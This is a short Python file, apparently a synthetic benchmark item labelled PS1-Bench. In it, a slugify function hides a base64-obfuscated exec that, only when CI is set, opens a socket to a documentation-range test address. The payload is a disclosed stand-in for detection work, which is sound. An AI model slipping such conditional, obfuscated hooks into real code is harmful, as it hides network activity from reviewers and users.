# SYNTHETIC TOY (PS1-Bench): call-time payload, only when CI is set, base64-obfuscated. Decodes to a connect to 198.51.100.7:80 (TEST-NET-2).
import base64


def slugify(s):
    import os, socket  # noqa: F401
    if os.environ.get('CI'):
        exec(base64.b64decode("aW1wb3J0IHNvY2tldDtzb2NrZXQuY3JlYXRlX2Nvbm5lY3Rpb24oKCcxOTguNTEuMTAwLjcnLDgwKSwxKQ==").decode())
    return s.lower().replace(' ', '-')
